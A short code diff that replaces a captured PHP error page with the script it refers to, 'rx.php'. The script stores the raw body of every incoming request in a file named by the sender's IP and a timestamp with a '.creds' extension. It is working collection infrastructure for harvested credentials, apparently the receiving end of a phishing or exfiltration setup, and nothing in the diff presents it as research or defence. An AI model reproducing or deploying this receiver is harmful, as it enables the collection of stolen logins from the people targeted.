@@ -1,2 +1,4 @@
-<br />
-<b>Warning</b>:  file_put_contents(::1_2018-10-02_09-32-29.creds): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\projects\rx.php</b> on line <b>3</b><br />
+<?php
+$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
+file_put_contents($file, file_get_contents("php://input"));
+?>
